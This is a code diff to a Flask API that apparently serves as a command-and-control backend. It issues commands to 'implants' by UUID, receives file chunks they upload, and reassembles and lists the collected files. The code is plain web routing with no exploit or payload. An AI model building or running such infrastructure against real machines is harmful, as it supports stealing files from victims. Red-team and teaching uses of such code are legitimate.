@@ -3,6 +3,7 @@ from app.api import services
 
 import logging
 
+
 logging.basicConfig(level=logging.DEBUG)
 
 BP = Blueprint("api", __name__, url_prefix="/api/v1")
@@ -50,11 +51,11 @@ def get_commands(uuid):
     commands = services.get_commands_for_uuid(uuid)
     if commands is None:
         return jsonify({"message": "No commands found"}), 404
-    return jsonify(commands)
+    return jsonify(commands), 200
 
 
-@BP.route("/file", methods=["POST"])
-def file_chunk():
+@BP.route("/files", methods=["POST"])
+def post_file():
     data = request.get_json()
     implant_uuid = data.get("uuid")
     file_id = data.get("file_id")
@@ -65,4 +66,27 @@ def file_chunk():
         return jsonify({"status": "Invalid data"}), 400
 
     services.save_file_chunk(implant_uuid, file_id, chunk_index, chunk_data)
+
+    logging.debug(f"Received chunk from {implant_uuid}")
+
     return jsonify({"status": "Chunk received"}), 200
+
+
+@BP.route("/files/<file_id>", methods=["GET"])
+def get_file(file_id):
+    encoded_file_data, file_type = services.assemble_file(file_id)
+
+    if encoded_file_data is None:
+        return jsonify({"message": "No file with given id found"}), 404
+
+    return jsonify({"file_type": file_type, "encoded_file": encoded_file_data}), 200
+
+
+@BP.route("/files", methods=["GET"])
+def get_files():
+    # {implant_uuid: [file1_id, file2_id...]}
+    file_ids = services.get_file_ids()
+
+    if file_ids is None:
+        return jsonify({"message": "No files found"}), 404
+    return jsonify(file_ids), 200
